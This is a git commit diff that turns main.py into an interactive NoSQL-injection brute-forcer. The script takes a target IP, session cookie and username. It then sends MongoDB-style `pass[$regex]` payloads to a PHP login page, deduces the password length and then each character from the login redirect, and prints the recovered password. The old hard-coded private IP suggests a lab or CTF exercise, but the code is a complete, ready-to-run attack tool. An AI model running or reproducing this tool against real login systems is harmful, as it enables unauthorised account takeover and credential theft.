2a6379f6dd0ade21b7bfc375bfbaa1934bea93a3
Alex <richfordalex@gmail.com>
2024-11-28 16:33:36 +0000

    Added ui and password brute force

--- main.py
+++ main.py
@@ -1,40 +1,90 @@
 import requests
+import string
 
-url = "http://10.10.66.192/login.php"
+print('''
+
+_   __     _____ ____    __    _       ____             __     
+   / | / /___ / ___// __ \  / /   (_)     / __ )_______  __/ /____ 
+  /  |/ / __ \\__ \/ / / / / /   / /_____/ __  / ___/ / / / __/ _ \ 
+ / /|  / /_/ /__/ / /_/ / / /___/ /_____/ /_/ / /  / /_/ / /_/  __/
+/_/ |_/\____/____/\___\_\/_____/_/     /_____/_/   \__,_/\__/\___/                                                                  
+
+''')
+
+print("*** NoSQLi Brute *** " + "\n")
+ip = input("Enter Target IP: ")
+session_id = input("Enter Session ID: ")
+user = input("Enter name of user: ")
+print(f"\nAddress => {ip}")
+print(f"Session_id => {session_id}")
+print(f"User => {user}" + "\n")
+
+url = f"http://{ip}/login.php"
 
 headers = {
-    'Host': '10.10.66.192',
+    'Host': ip,
     'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.5',
     'Accept-Encoding': 'gzip, deflate, br',
     'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'http://10.10.66.192',
+    'Origin': f'http://{ip}',
     'Connection': 'keep-alive',
-    'Referer': 'http://10.10.66.192/',
-    'Cookie': 'PHPSESSID=n2d9k055vjnrfcq260nta0mnq2',
+    'Referer': f'http://{ip}/',
+    'Cookie': f'PHPSESSID={session_id}',
     'Upgrade-Insecure-Requests': '1',
     'Priority': 'u=0, i'
 }
 
-def len_of_pass():
+def len_of_pass(username):
+    """Identify length of user password """
 
-   user = input("Enter name of user: ")
-
-   for i in range(100):
+    for i in range(100):
        value = i
 
-       payload = f"user={user}&pass[$regex]=^.{{{value}}}$&remember=on"
+       # regex payload to brute force pass len
+       payload = f"user={username}&pass[$regex]=^.{{{value}}}$&remember=on"
        response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
 
+       # Identify anomalies in response headers
        if 'Location' in response.headers and response.headers['Location'] != "/?err=1":
            print(f"Password length is {value}!")
-           break
+           length = value
+           return length
        else:
            pass
 
+def find_pass(length, username):
+    """ Identify password """
 
-print("*** NoSQL Brute *** " + "\n")
-len_of_pass()
+    print( "\n" + "Loading...." + "\n")
+    password = ""
+
+    for pos in range(1, length + 1):
+
+        # Combining ascii letters, digits, and punctuation
+        charset = string.ascii_letters + string.digits + string.punctuation
+        for char in charset:
+
+            current_pass = password + char + "." * (length - len(password) - 1)
+
+            payload = f"user={username}&pass[$regex]=^{current_pass}$&remember=on"
+            response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
+
+            if 'Location' in response.headers and response.headers['Location'] != "/?err=1":
+                password += char
+                break
+            else:
+                pass
+
+    print("=================================")
+    print(f"Password discovered: {password}!")
+    print("=================================")
+
+
+password_length = len_of_pass(user)
+if password_length:
+    find_pass(password_length, user)
+
 
 
